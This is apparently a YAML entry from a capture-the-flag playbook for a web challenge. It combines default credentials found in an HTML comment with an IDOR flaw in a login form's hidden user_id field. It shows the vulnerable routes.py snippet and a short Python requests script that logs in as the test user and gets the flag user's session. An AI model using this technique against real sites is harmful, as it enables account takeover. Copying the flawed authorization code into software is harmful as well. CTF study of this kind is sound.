name: idor_default_credentials
category: web
tags: [idor, default_credentials, authentication_bypass, broken_authorization]
indicators:
  - "Test account in HTML comments"
  - "Hidden user_id field in login form"
  - "User-provided ID used after authentication"

tricks:
  - name: "Step 1: Discover default credentials"
    when: "View page source"
    how: "Check HTML comments"
    payload: |
      <!-- TODO: Delete the testing account (test:test). -->
      # Found default credentials: test:test

  - name: "Step 2: Discover IDOR vulnerability"
    when: "Analyze login flow"
    how: "Check form hidden fields"
    payload: |
      <input type="hidden" name="user_id" value="10032">

      # Vulnerable code (routes.py):
      if User.query.get(request.form['user_id']):
          session['user_id'] = request.form['user_id']  # IDOR!

  - name: "Step 3: Exploit IDOR"
    when: "Found vulnerability"
    how: "Modify user_id parameter"
    payload: |
      # Normal: user_id = 10032 (test user)
      # Attack: user_id = 10001 (flag user)
      # Session becomes flag user after login!

  - name: "Step 4: Extract the flag"
    when: "Exploit IDOR"
    how: "Python exploit"
    payload: |
      s = requests.Session()
      s.post(f'{url}/', data={'username': 'test'})
      s.post(f'{url}/password/test', data={
          'username': 'test',
          'password': 'test',
          'user_id': '10001'  # Flag user's ID
      })
      dashboard = s.get(f'{url}/dashboard')  # Shows flag user info
